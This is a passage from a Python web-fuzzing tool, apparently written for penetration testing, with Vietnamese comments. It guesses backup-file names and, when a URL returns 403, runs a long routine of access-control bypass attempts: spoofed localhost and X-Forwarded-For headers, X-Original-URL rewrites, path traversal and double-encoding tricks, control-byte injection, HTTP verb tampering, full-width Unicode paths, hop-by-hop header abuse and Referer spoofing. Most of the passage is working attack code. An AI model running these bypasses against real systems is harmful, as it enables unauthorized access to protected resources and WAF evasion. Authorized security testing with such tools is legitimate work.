        # 4. Combinations (Sequential Pairs & Triples)
        # Sliding window size 2
        for i in range(len(tokens) - 1):
            p1 = tokens[i]
            p2 = tokens[i+1]
            # styles: p1_p2, p1-p2, p1.p2
            candidates.add(f"{p1}_{p2}")
            candidates.add(f"{p1}-{p2}")
            candidates.add(f"{p1}.{p2}") # tạo ra kiểu sub.js, web.js
            
            # Lowercase versions
            candidates.add(f"{p1.lower()}_{p2.lower()}")
            candidates.add(f"{p1.lower()}.{p2.lower()}")

        # Sliding window size 3 (e.g. sub_domain_script)
        if len(tokens) >= 3:
             for i in range(len(tokens) - 2):
                p1, p2, p3 = tokens[i], tokens[i+1], tokens[i+2]
                candidates.add(f"{p1}_{p2}_{p3}")
                candidates.add(f"{p1.lower()}_{p2.lower()}_{p3.lower()}")

        # 5. Full Path Joined
        # Nếu path có > 1 phần tử (vd: Script/web/js) -> script_web_js
        path_only_parts = [p for p in parsed.path.split('/') if p]
        if len(path_only_parts) > 1:
            candidates.add("_".join(path_only_parts))
            candidates.add("_".join(path_only_parts).lower())
            candidates.add("-".join(path_only_parts).lower())

        # Extensions to append (Use Active Suffixes provided by user/default)
        if not active_suffixes: 
            # Fallback if empty
            exts = ['.zip', '.rar', '.tar.gz', '.7z', '.sql', '.bak', '.old', '.tgz']
        else:
            exts = active_suffixes
        
        final_payloads = []
        for c in candidates:
            # Add extension to stem
            for ext in exts:
                final_payloads.append(c + ext)
            
        return list(set(final_payloads))
        
    except:
        return []

def get_color_for_status(status_code):
    if 200 <= status_code < 300: return Colors.GREEN
    if 300 <= status_code < 400: return Colors.BLUE
    if status_code == 403: return Colors.YELLOW
    if status_code == 404: return Colors.RED
    if status_code >= 500: return Colors.RED
    return Colors.GREY

def save_to_file(filepath, content):
    """Ghi kết quả vào file với thread lock"""
    if not filepath: return
    with file_lock:
        try:
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(content + "\n")
        except Exception as e:
            pass

def extract_tokens(text):
    """Trích xuất từ khóa để so sánh cấu trúc content"""
    # Chỉ lấy chữ cái, bỏ qua số, độ dài >= 3
    return set(re.findall(r'[a-zA-Z]{3,}', text))

def calculate_jaccard(set1, set2):
    """Tính độ tương đồng Jaccard giữa 2 set token"""
    if not set1 and not set2: return 1.0
    if not set1 or not set2: return 0.0
    intersection = len(set1.intersection(set2))
    union = len(set1.union(set2))
    return intersection / union

def detect_soft_404(session, base_url, headers, proxies):
    """
    Phát hiện Soft 404 thông minh (Status, Redirect, Content Structure)
    Trả về dict signature
    """
    try:
        # Probe 1
        path1 = f"soft404_{random.randint(1000,9999)}"
        url1 = urllib.parse.urljoin(base_url, path1)
        r1 = session.get(url1, headers=headers, proxies=proxies, timeout=5, allow_redirects=False, verify=False)
        
        # Probe 2
        path2 = f"soft404_{random.randint(1000, 9999)}"
        url2 = urllib.parse.urljoin(base_url, path2)
        r2 = session.get(url2, headers=headers, proxies=proxies, timeout=5, allow_redirects=False, verify=False)

        # 1. Check Stability
        if r1.status_code != r2.status_code: return None
        
        sig = {
            'status': r1.status_code,
            'avg_size': (len(r1.content) + len(r2.content)) / 2,
            'is_redirect': False,
            'location': None,
            'tokens': extract_tokens(r1.text)
        }

        # 2. Check Redirect (3xx)
        if 300 <= r1.status_code < 400:
            sig['is_redirect'] = True
            sig['location'] = r1.headers.get('Location', '')
        
        return sig

    except:
        return None

def attempt_bypass_403(session, url, base_headers, proxies, timeout, soft_404_signatures=None):
    """
    Thử nghiệm các kỹ thuật bypass 403 cơ bản khi gặp status 403
    """
    success_msg = []
    
    # Pre-calculate base for soft 404 check
    parsed = None
    base_domain = ""
    try:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        base_domain = f"{parsed.scheme}://{parsed.netloc}"
    except:
        path = ""

    def is_soft_404(res_obj):
        # Nếu không có signature thì ko check được, coi là Valid
        if not soft_404_signatures or base_domain not in soft_404_signatures:
            return False
            
        sig = soft_404_signatures[base_domain]
        # 1. Check Size gần giống Soft 404 gốc
        if abs(len(res_obj.content) - sig['avg_size']) < (sig['avg_size'] * 0.1 + 50):
            return True
            
        # 2. Check Redirect Location (nếu 200 OK thì ko check location, nhưng check content HTML title?)
        # 3. Check Jaccard (Advanced)
        if len(res_obj.text) > 100:
            curr_tokens = extract_tokens(res_obj.text)
            sim = calculate_jaccard(sig['tokens'], curr_tokens)
            if sim > 0.85: return True
            
        return False

    # 1. Header Manipulation (Static IPs & Localhost)
    for header in BYPASS_HEADERS_LIST:
        try:
            headers = base_headers.copy()
            headers.update(header)
            res = session.get(url, headers=headers, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
            if res.status_code == 200 and not is_soft_404(res):
                header_str = str(header).replace('{', '').replace('}', '').replace("'", "")
                success_msg.append(f"{Colors.GREEN}[Header: {header_str}]{Colors.RESET}")
        except: pass

    # 1.1 Dynamic Headers (Path based)
    # X-Original-URL & X-Rewrite-URL
    if path:
        dynamic_headers = [
            {"X-Original-URL": path},
            {"X-Rewrite-URL": path},
            {"X-Custom-IP-Authorization": "127.0.0.1"}
        ]
        for header in dynamic_headers:
            try:
                headers = base_headers.copy()
                headers.update(header)
                res = session.get(url, headers=headers, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                if res.status_code == 200 and not is_soft_404(res):
                    header_str = str(header).replace('{', '').replace('}', '').replace("'", "")
                    success_msg.append(f"{Colors.GREEN}[Header: {header_str}]{Colors.RESET}")
            except: pass


    # 2. URL Manipluation (Suffixes)
    for suffix in BYPASS_URL_SUFFIXES:
        try:
            bypass_url = url + suffix
            # Force URL raw để tránh requests/urllib3 tự động normalize path (../ -> /)
            req = requests.Request('GET', bypass_url, headers=base_headers)
            prepped = session.prepare_request(req)
            prepped.url = bypass_url 
            
            res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
            if res.status_code == 200 and not is_soft_404(res):
                 success_msg.append(f"{Colors.GREEN}[URL: {suffix}]{Colors.RESET}")
        except: pass
    
    # 3. Path Traversal Trick (/admin/./)
    if url.endswith('/'):
         tricks = ['.;/', './', '%2e/']
         for t in tricks:
             try:
                 bypass_url = url + t
                 req = requests.Request('GET', bypass_url, headers=base_headers)
                 prepped = session.prepare_request(req)
                 prepped.url = bypass_url
                 
                 res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                 if res.status_code == 200 and not is_soft_404(res):
                     success_msg.append(f"{Colors.GREEN}[Trick: {t}]{Colors.RESET}")
             except: pass

    # 4. Deep Path Injection (Multi-level)
    # Thử inject vào TẤT CẢ các tầng thư mục của URL
    try:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        if not path: path = "/"
        
        segments = path.split('/') # ['','test','file']
        
        # Chỉ chạy nếu có path thực sự (segments > 1)
        if len(segments) > 1:
            infixes = [
                "%09", "%20", ";", ".", "./", ".;", "..;", ";/..;", "..;/", "%2e", "/", "//", "/./",
                "%252e", "%u002e", "///", "\\", "/../", "/.../"
            ]
            base_origin = f"{parsed.scheme}://{parsed.netloc}"

            # Duyệt qua từng segment (bỏ qua cái đầu tiên rỗng)
            # i chạy từ 1 đến hết list segments
            # Vd: ['', 'a', 'b'] -> i=1 ('a'), i=2 ('b')
            for i in range(1, len(segments)):
                for infix in infixes:
                    # Case 1: Folder Form (/INFIX/)
                    # /a/b -> level 1: /INFIX/a/b
                    try:
                        new_segs = segments[:i] + [infix] + segments[i:]
                        mutated_path = "/".join(new_segs)
                        
                        bypass_url = base_origin + mutated_path
                        
                        req = requests.Request('GET', bypass_url, headers=base_headers)
                        prepped = session.prepare_request(req)
                        prepped.url = bypass_url 
                        res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                        
                        if res.status_code == 200 and not is_soft_404(res):
                            success_msg.append(f"{Colors.GREEN}[Deep Infix: .../{infix}/...]{Colors.RESET}")
                    except: pass
                    
                    # Case 2: Sticky Form (/;name)
                    # /a/b -> level 1: /;a/b
                    if segments[i]: # Chỉ inject nếu segment có tên
                        try:
                             mutated_segs = segments[:]
                             mutated_segs[i] = infix + segments[i]
                             mutated_path = "/".join(mutated_segs)
                             
                             bypass_url = base_origin + mutated_path
                             
                             req = requests.Request('GET', bypass_url, headers=base_headers)
                             prepped = session.prepare_request(req)
                             prepped.url = bypass_url 
                             res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                             
                             if res.status_code == 200 and not is_soft_404(res):
                                 success_msg.append(f"{Colors.GREEN}[Deep Sticky: .../{infix}{segments[i]}]{Colors.RESET}")
                        except: pass
    except: pass

    # 5. Path Obfuscation (URL Encoding) - [NEW]
    # Slashes -> %2f, %252f, %u002f
    # Dots -> %2e, %252e 
    try:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        if not path: path = "/"
        
        base_origin = f"{parsed.scheme}://{parsed.netloc}"
        enc_variations = []

        # Chỉ encode nếu path có slash (ngoài root)
        if len(path) > 1:
            # 1. Encode các slash phân tách (trừ slash đầu tiên)
            # /path/to/file -> /path%2fto%2ffile
            clean_path = path[1:] if path.startswith('/') else path
            
            # Mẫu thay thế
            replacements = {
                '/': ['%2f', '%252f', '%u002f', '%ef%bc%8f'], # Slashes
                # '.': ['%2e', '%252e', '%u002e'] # Dots (nếu muốn)
            }
            
            for char, repls in replacements.items():
                if char in clean_path:
                    for r in repls:
                         # Replacement toàn bộ
                         enc_path = "/" + clean_path.replace(char, r)
                         enc_variations.append(enc_path)
                         
                         # Replacement từng phần (chỉ cái cuối cùng) - Hữu ích để bypass mod_security chặn filename
                         # /admin/config.php -> /admin%2fconfig.php
                         if char == '/':
                             base_p, file_p = clean_path.rsplit(char, 1)
                             enc_path_last = "/" + base_p + r + file_p
                             enc_variations.append(enc_path_last)

            # 2. Case Specical: /test%2fdangky-agr...
            # Người dùng yêu cầu case encode cụ thể ở 1 vị trí. 
            # Đã bao gồm trong logic trên (encode toàn bộ hoặc encode cái cuối).
            
            # Thử gửi
            for v_path in list(set(enc_variations)):
                 try:
                     bypass_url = base_origin + v_path
                     req = requests.Request('GET', bypass_url, headers=base_headers)
                     prepped = session.prepare_request(req)
                     prepped.url = bypass_url 
                     
                     res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                     if res.status_code == 200 and not is_soft_404(res):
                             success_msg.append(f"{Colors.GREEN}[Encode: {v_path}]{Colors.RESET}")
                 except: pass
    except: pass
    
    # 6. Character Encoding (Within segments) - [NEW]
    # e.g., /admin -> /%61dmin, /admin.php -> /admin%2ephp
    try:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        base_origin = f"{parsed.scheme}://{parsed.netloc}"
        
        # Lấy filename cuối cùng
        path_no_slash = path.rstrip('/')
        if not path_no_slash: path_no_slash = ""

        if len(path_no_slash) > 1:
            base_path_dir = path_no_slash.rsplit('/', 1)[0]
            if base_path_dir == "": base_path_dir = "/" # Nếu là root file /abc
            elif not base_path_dir.endswith('/'): base_path_dir += "/"

            filename = path_no_slash.split('/')[-1]
            
            char_variations = []
            
            if filename:
                # 0. Case Sensitivity (Upper/Lower) - [NEW]
                # /SECRET
                char_variations.append(base_path_dir + filename.upper())
                # /Secret (Title case)
                char_variations.append(base_path_dir + filename.capitalize())

                # 1. Encode dot (.)
                if '.' in filename:
                    # file.php -> file%2ephp
                    var1 = base_path_dir + filename.replace('.', '%2e')
                    char_variations.append(var1)
                    
                    # file.php -> file%252ephp (Double encode)
                    var2 = base_path_dir + filename.replace('.', '%252e')
                    char_variations.append(var2)

                # 2. Encode first char
                # admin -> %61dmin
                first_char = filename[0]
                if first_char.isalnum():
                    hex_val = hex(ord(first_char))[2:].upper()
                    
                    # Single encode: %61
                    var3 = base_path_dir + f"%{hex_val}" + filename[1:]
                    char_variations.append(var3)
                    
                    # Double encode first char: %2561
                    var3_dbl = base_path_dir + f"%25{hex_val}" + filename[1:]
                    char_variations.append(var3_dbl)

                # 3. Encode whole filename
                # admin -> %61%64%6d%69%6e
                full_enc = "".join([f"%{hex(ord(c))[2:].upper()}" for c in filename])
                var4 = base_path_dir + full_enc
                char_variations.append(var4)
                
                # 4. Leading Slash variations (Special Encoding)
                # /admin -> /%2fadmin, /%2f%2fadmin
                var_slash1 = base_path_dir + "%2f" + filename
                char_variations.append(var_slash1)
                 
                var_slash2 = base_path_dir + "%2f%2f" + filename
                char_variations.append(var_slash2)

                # 5. Unicode Path Variations - [NEW]
                # /%ef%bc%8fpath
                var_uni1 = base_path_dir + "%ef%bc%8f" + filename
                char_variations.append(var_uni1)
                
                # Send Requests for Character Encoding
                for v_path in list(set(char_variations)):
                    try:
                        bypass_url = base_origin + v_path
                        req = requests.Request('GET', bypass_url, headers=base_headers)
                        prepped = session.prepare_request(req)
                        prepped.url = bypass_url 
                        
                        res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                        
                        if res.status_code == 200 and not is_soft_404(res):
                            success_msg.append(f"{Colors.GREEN}[Char Encode: {v_path}]{Colors.RESET}")
                    except: pass
    except: pass  

    # 7. Protocol/Parser Fuzzing (Byte Injection) - [NEW]
    # Inserts specific ASCII/High-Byte characters at path boundaries
    # Based on technique: /%xx/admin, /admin%xx/
    try:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        if not path or path == "/": path = ""
        base_origin = f"{parsed.scheme}://{parsed.netloc}"
        
        # Target Critical Bytes:
        # 0x00-0x1F (Control Chars), 0x7F-0xFF (High Bytes), and some specials
        # Limited set for performance, can be expanded to range(256) if needed
        critical_bytes = [0x00, 0x09, 0x0a, 0x0d, 0x85, 0xa0, 0x0b, 0x0c] 
        # Add quick high-byte check range (e.g. 0x80 to 0x85)
        critical_bytes.extend(range(0x80, 0x86))
        
        segments = path.strip('/').split('/')
        segments = [s for s in segments if s]
        
        if segments:
            for b in critical_bytes:
                hex_char = f"%{b:02x}"
                variations = []

                # Strategy A: Trailing Suffix Injection (/admin%xx)
                # /admin/dashboard -> /admin/dashboard%85
                var_suffix = path + hex_char
                variations.append(var_suffix)
                
                # Strategy B: Segment Sandwich (Intermediate Injection)
                # /admin/dashboard -> /admin%85/dashboard
                # /admin/dashboard -> /admin/dashboard%85 (Covered above)
                if len(segments) > 1:
                     # Inject at first segment boundary
                     # /admin/dash -> /admin%85/dash
                     new_path_1 = "/" + segments[0] + hex_char + "/" + "/".join(segments[1:])
                     variations.append(new_path_1)

                # Strategy C: Prepend Injection
                # /admin -> /%85/admin
                var_prepend = "/" + hex_char + "/" + "/".join(segments)
                variations.append(var_prepend)

                # Strategy D: Leading Byte
                # /admin -> /%85admin
                var_lead = "/" + hex_char + "".join(segments) # Note: this merges path if multiple segments? 
                # Better: /%85segment1/segment2
                var_lead_seg = "/" + hex_char + segments[0]
                if len(segments) > 1:
                     var_lead_seg += "/" + "/".join(segments[1:])
                variations.append(var_lead_seg)

                # Send
                for v_path in list(set(variations)):
                    try:
                        bypass_url = base_origin + v_path
                        req = requests.Request('GET', bypass_url, headers=base_headers)
                        prepped = session.prepare_request(req)
                        prepped.url = bypass_url 
                        
                        res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                        
                        if res.status_code == 200 and not is_soft_404(res):
                            success_msg.append(f"{Colors.GREEN}[Byte Fuzz: ...{hex_char}... ({v_path})]{Colors.RESET}")
                    except: pass
    except: pass
    
    # 8. Escape Sequence Fuzzing (\x, \u, .. variations) - [NEW]
    # Covers: \u002e, \x2e, \u002f, \x2f and double-escaped versions
    try:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        if not path: path = "/"
        base_origin = f"{parsed.scheme}://{parsed.netloc}"
        
        esc_variations = []
        
        # A. Path Separator Swapping
        # /admin/user -> \u002fadmin\u002fuser
        if "/" in path:
            esc_variations.append(path.replace("/", "\\u002f"))
            esc_variations.append(path.replace("/", "\\x2f"))
            esc_variations.append(path.replace("/", "\\")) # Backslash swap
            esc_variations.append(path.replace("/", "\\\\")) # Double backslash

        # B. Dot Swapping
        if "." in path:
            esc_variations.append(path.replace(".", "\\u002e"))
            esc_variations.append(path.replace(".", "\\x2e"))
            
        # C. Traversal Injection with Escapes
        # Appends /.. but with escape chars to confuse parser
        if not path.endswith('/'): path += "/"
        
        # List of ".." equivalents
        dot_dots = [
            "\\u002e\\u002e",     # \u002e\u002e
            "\\x2e\\x2e",         # \x2e\x2e
            "\\u002e\\u002e/",    # \u002e\u002e/
            "\\x2e\\x2e/",        # \x2e\x2e/
            "..\\u002f",          # ..\u002f
            "..\\x2f",            # ..\x2f
            "\\u002e\\u002e\\u002f", # \u002e\u002e\u002f
            "%5cu002e%5cu002e",   # Encoded backslash version
        ]
        
        for dd in dot_dots:
            # Suffix injection: /path/..
            esc_variations.append(path + dd)
            # Suffix injection (cleaned): /path..
            esc_variations.append(path.rstrip('/') + dd)

        # Send
        for v_path in list(set(esc_variations)):
            try:
                # Need to handle leading slash if replaced
                if not v_path.startswith('/') and not v_path.startswith('\\'):
                     v_path = "/" + v_path
                     
                bypass_url = base_origin + v_path
                req = requests.Request('GET', bypass_url, headers=base_headers)
                prepped = session.prepare_request(req)
                prepped.url = bypass_url 
                
                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                
                if res.status_code == 200 and not is_soft_404(res):
                    success_msg.append(f"{Colors.GREEN}[Escape Fuzz: {v_path}]{Colors.RESET}")
            except: pass
    except: pass

    # 9. HTTP Methods & Verb Tampering - [NEW]
    # Checks if ACL only blocks GET but allows others
    # Useful for REST APIs, Django, Spring Boot
    try:
        methods = ['POST', 'PUT', 'PATCH', 'TRACE', 'HEAD', 'OPTIONS', 'CONNECT', 'PROPFIND']
        for method in methods:
            try:
                # Standard method change
                req = requests.Request(method, url, headers=base_headers)
                prepped = session.prepare_request(req)
                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                
                if res.status_code == 200 and not is_soft_404(res):
                    status_lbl = f"{Colors.GREEN}[Method: {method}]{Colors.RESET}"
                    if method == 'HEAD': 
                        c_len = int(res.headers.get('Content-Length', 0))
                        status_lbl += " (Len: {})".format(c_len)
                        if c_len == 0:
                            status_lbl += f" {Colors.YELLOW}[Low Confidence]{Colors.RESET}"
                    success_msg.append(status_lbl)
                
                # Method Override Headers (X-HTTP-Method-Override)
                # Useful when WAF blocks POST/PUT but App supports Override on GET
                headers_override = base_headers.copy()
                headers_override['X-HTTP-Method-Override'] = method
                req_ov = requests.Request('GET', url, headers=headers_override)
                prepped_ov = session.prepare_request(req_ov)
                res_ov = session.send(prepped_ov, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)

                if res_ov.status_code == 200 and not is_soft_404(res_ov):
                    success_msg.append(f"{Colors.GREEN}[Method-Override: {method}]{Colors.RESET}")       
            except: pass
    except: pass

    # 10. Unicode Normalization (NFKC/NFKD) - [NEW]
    # Exploits Python/Node.js/Java string normalization logic.
    # Uses Full-width characters to bypass WAF string matching.
    try:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        base_origin = f"{parsed.scheme}://{parsed.netloc}"
        
        # Dictionary of Full-width substitutions for common chars
        # a -> ａ, d -> ｄ, m -> ｍ, i -> ｉ, n -> ｎ, etc.
        # Only mapping alphanumeric to full-width versions (U+FF01 to U+FF5E)
        
        def to_full_width(s):
            res = ""
            for char in s:
                code = ord(char)
                if 0x21 <= code <= 0x7E:
                     # ASCII to Full-width: + 0xFEE0
                     res += chr(code + 0xFEE0)
                else:
                    res += char
            return res
            
        path_variations = []
        path_no_slash = path.lstrip('/')
        
        if path_no_slash:
             # Variant 1: Full conversion
             # /admin -> /ａｄｍｉｎ
             path_variations.append("/" + to_full_width(path_no_slash))
             
             # Variant 2: Partial conversion (First char only)
             # /admin -> /ａdmin
             if len(path_no_slash) > 0:
                 first_char = path_no_slash[0]
                 rest = path_no_slash[1:]
                 if 0x21 <= ord(first_char) <= 0x7E:
                     path_variations.append("/" + chr(ord(first_char) + 0xFEE0) + rest)

        for v_path in path_variations:
            try:
                # Note: requests/urllib might auto-encode these to UTF-8 bytes (%ef%bd%81...)
                # This is actually DESIRED because the Server receives bytes, decodes utf-8 to unicode strings,
                # then normalizes.
                bypass_url = base_origin + v_path
                req = requests.Request('GET', bypass_url, headers=base_headers)
                prepped = session.prepare_request(req)
                prepped.url = bypass_url 
                
                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                
                if res.status_code == 200 and not is_soft_404(res):
                    success_msg.append(f"{Colors.GREEN}[Unicode NFKC: {v_path}]{Colors.RESET}")
            except: pass
    except: pass

    # 11. Cloud/WAF Headers & Port Bypass - [NEW]
    # Specialized headers for specific WAFs and internal routing that are not in basic list.
    try:
        # A. unique Extended Headers (Not in BYPASS_HEADERS_LIST)
        waf_headers = [
            {"X-HTTP-Host-Override": "127.0.0.1"},
            {"Forwarded": "for=127.0.0.1;by=127.0.0.1;proto=http"},
             # Some WAFs check for specific private ranges
            {"X-Forwarded-For": "192.168.1.1"}, 
            {"X-Forwarded-For": "10.0.0.1"},
            {"X-Forwarded-For": "172.16.0.1"},
        ]
        
        parsed = urllib.parse.urlparse(url)
        
        for h_dict in waf_headers:
             try:
                 new_headers = base_headers.copy()
                 new_headers.update(h_dict)
                 
                 req = requests.Request('GET', url, headers=new_headers)
                 prepped = session.prepare_request(req)
                 res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                 
                 if res.status_code == 200 and not is_soft_404(res):
                     lbl = ",".join(h_dict.keys())
                     success_msg.append(f"{Colors.GREEN}[WAF Header: {lbl}]{Colors.RESET}")
             except: pass

        # B. Host Header Port Injection (Virtual Host Bypass)
        # Host: target.com:80, Host: target.com:443, Host: localhost
        ports = [80, 443, 8080, 8443]
        base_netloc = parsed.netloc.split(':')[0] # remove existing port
        
        for p in ports:
            try:
                new_headers = base_headers.copy()
                new_headers['Host'] = f"{base_netloc}:{p}"
                
                req = requests.Request('GET', url, headers=new_headers)
                prepped = session.prepare_request(req)
                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                
                if res.status_code == 200 and not is_soft_404(res):
                     success_msg.append(f"{Colors.GREEN}[Host Port: :{p}]{Colors.RESET}")
            except: pass
            
    except: pass
    
    # 12. Windows/IIS/NTFS Stream Traits (Effective on some Nginx proxies) - [NEW]
    # ::$DATA, Trailing Dots/Spaces handled weirdly by reverse proxies
    try:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        if not path: path = "/"
        base_origin = f"{parsed.scheme}://{parsed.netloc}"
        
        win_suffixes = [
            "::$DATA",             # NTFS Stream
            " ",                   # Trailing Space (Windows ignores)
            ".",                   # Trailing Dot (Windows ignores)
            "..",                  # Trailing Dot Dot
            "?",                   # Empty Query
            "??",
            "//",                  # Trailing double slash
            "::$DATA"
        ]
        
        for ws in win_suffixes:
            try:
                # Append to path (handled better than suffix list for raw sending)
                bypass_url = base_origin + path + ws
                req = requests.Request('GET', bypass_url, headers=base_headers)
                prepped = session.prepare_request(req)
                prepped.url = bypass_url 
                
                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                if res.status_code == 200 and not is_soft_404(res):
                    success_msg.append(f"{Colors.GREEN}[Win/Stream: ...{ws}]{Colors.RESET}")
            except: pass
    except: pass

    # 13. Hop-By-Hop Header Abuse - [NEW]
    # Instructs the Load Balancer/Proxy to drop specific headers known to block requests.
    try:
        # Common headers used for ACLs that we want the Proxy to drop before sending to backend
        hop_headers = ["X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP", "Cookie", "Authorization"]
        
        for h_drop in hop_headers:
             try:
                 new_headers = base_headers.copy()
                 # Syntax: "Connection: close, HeaderName" causes proxy to remove HeaderName
                 new_headers["Connection"] = f"close, {h_drop}" 
                 
                 req = requests.Request('GET', url, headers=new_headers)
                 prepped = session.prepare_request(req)
                 res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                 
                 if res.status_code == 200 and not is_soft_404(res):
                      success_msg.append(f"{Colors.GREEN}[Hop-By-Hop Drop: {h_drop}]{Colors.RESET}")
             except: pass
    except: pass

    # 14. Trusted Referer & Origin Spoofing - [NEW]
    # Effective against "hotlink protection" or internal-only Access Control checks.
    try:
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        trust_origins = [
            base,                       # Self-referencing
            base + "/admin",            # Pretend coming from admin panel
            base + "/login",            # Pretend coming from login
            "http://127.0.0.1",         # Localhost referral
            "https://localhost",
            "null"                      # Sometimes bypasses null origin checks
        ]
        
        for trust_ref in trust_origins:
             try:
                 h_ref = base_headers.copy()
                 h_ref['Referer'] = trust_ref
                 h_ref['Origin'] = trust_ref
                 
                 req = requests.Request('GET', url, headers=h_ref)
                 prepped = session.prepare_request(req)
                 res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
                 
                 if res.status_code == 200 and not is_soft_404(res):
                      success_msg.append(f"{Colors.GREEN}[Trusted Ref: {trust_ref}]{Colors.RESET}")
             except: pass
    except: pass

    if success_msg:
        # Loại bỏ trùng lặp và trả về danh sách
        return sorted(list(set(success_msg)))

    return []

def check_url(session, url, base_headers, proxies, filters, use_random_agent, delay, match_codes, filter_codes, output_file, timeout, soft_404_signatures=None, retry_count=0, bypass_403=False):
    try:
        if delay > 0 and retry_count == 0: time.sleep(delay)

        current_headers = base_headers.copy()
        if use_random_agent:
            current_headers['User-Agent'] = random.choice(USER_AGENTS)

        res = session.get(url, headers=current_headers, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
        
        status = res.status_code

        # --- RATE LIMIT HANDLING (429) ---
        if status == 429:
            global RATE_LIMIT_COUNTER
            with rate_limit_lock:
                RATE_LIMIT_COUNTER += 1
                curr_failed = RATE_LIMIT_COUNTER
            
            if curr_failed > 100:
                tqdm.write(f"{Colors.RED}[CRITICAL] Too Many 429 Errors (>100). Stop tool immediately to prevent IP Block.{Colors.RESET}")
                try: os._exit(1) # Kill forcedly
                except: sys.exit(1)

            if retry_count < 3: # Max 3 lần thử lại
                wait_t = 10 * (retry_count + 1)
                tqdm.write(f"{Colors.YELLOW}[!] 429 Too Many Requests tại {url}. Đang ngủ {wait_t}s rồi thử lại... (Total 429: {curr_failed}){Colors.RESET}")
                time.sleep(wait_t)
                return check_url(session, url, base_headers, proxies, filters, use_random_agent, delay, match_codes, filter_codes, output_file, timeout, soft_404_signatures, retry_count + 1, bypass_403)
            else:
                tqdm.write(f"{Colors.RED}[!] Bỏ qua {url} sau 3 lần gặp 429.{Colors.RESET}")
                return
        size_bytes = len(res.content)
        
        # --- FILTER STATUS ---
        if filter_codes and status in filter_codes: return
        if 'all' not in match_codes and status not in match_codes: return
        # ---------------------

        if filters['exclude_sizes'] and size_bytes in filters['exclude_sizes']: return 

        # --- SOFT 404 CHECK ---
        # Nếu đã bật Smart 404, ta kiểm tra xem response này có giống trang Soft 404 không
        if soft_404_signatures:
            parsed = urllib.parse.urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            
            if base in soft_404_signatures:
                sig = soft_404_signatures[base]
                if sig:
                    # 1. Check Status
                    if status == sig['status']:
                        # 2. Check Redirect Location (nếu có)
                        if sig['is_redirect']:
                            curr_loc = res.headers.get('Location', '')
                            if curr_loc == sig['location']:
                                return # Soft 404 Redirect
                        
                        # 3. Check Size (Fast check)
                        # Nếu size rất gần nhau (<5%) -> 99% Soft 404
                        size_diff = abs(size_bytes - sig['avg_size'])
                        if size_diff < (sig['avg_size'] * 0.05 + 20): 
                            return 

                        # 4. Check Structure (Jaccard) - Advanced
                        # Nếu size lệch (do tên file reflected vào), check cấu trúc content
                        # Chỉ check nếu response text đủ dài để thống kê
                        if len(res.text) > 100:
                            curr_tokens = extract_tokens(res.text)
                            similarity = calculate_jaccard(sig['tokens'], curr_tokens)
                            if similarity > 0.90: # Cấu trúc giống > 90%
                                return # Soft 404 Dynamic Content

        content_for_search = str(res.headers) + "\n" + res.text 
        if filters['exclude_regex'] and filters['exclude_regex'].search(content_for_search): return
        if filters['grep_regex'] and not filters['grep_regex'].search(content_for_search): return

        size_str = format_size(size_bytes)
        color = get_color_for_status(status)
        
        bypass_results = []
        # --- 403 BYPASS ATTEMPT ---
        if status == 403 and bypass_403:
            bypass_results = attempt_bypass_403(session, url, current_headers, proxies, timeout, soft_404_signatures)

        # 1. In ra màn hình (Có màu)
        msg_console = f"{color}[{status}]{Colors.RESET} | {Colors.CYAN}{size_str:>20}{Colors.RESET} | {url}"
        
        if bypass_results:
             tqdm.write(msg_console + f" {Colors.GREEN}[BYPASS FOUND! ({len(bypass_results)} payloads)]{Colors.RESET}")
             for item in bypass_results:
                 tqdm.write(f"    └── {item}")
        else:
             tqdm.write(msg_console)

        # 2. Ghi ra file (Không màu, định dạng text thuần)
        if output_file:
            msg_file = f"[{status}] | {size_str} | {url}"
            if bypass_results: 
                msg_file += " [BYPASS SUCCESS]"
                for item in bypass_results:
                     # Strip ANSI colors manually or using regex if available
                     clean_item = re.sub(r'\x1b\[[0-9;]*m', '', item)
                     msg_file += f"\n    --> {clean_item}"
            save_to_file(output_file, msg_file)

    except Exception:
        pass

def main():
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    args = get_arguments()
    
    if not args.url and not args.url_list:
        print(f"{Colors.RED}[!] Lỗi: Thiếu -u hoặc -L.{Colors.RESET}"); sys.exit(1)

    # --- PARSE STATUS CODES ---
    match_codes = []
    if args.match_code.lower() == 'all':
        match_codes = ['all']
    else:
        try: match_codes = [int(c.strip()) for c in args.match_code.split(',')]
        except: print(f"{Colors.RED}[!] Lỗi -mc.{Colors.RESET}"); sys.exit(1)

    filter_codes = []
    if args.filter_code:
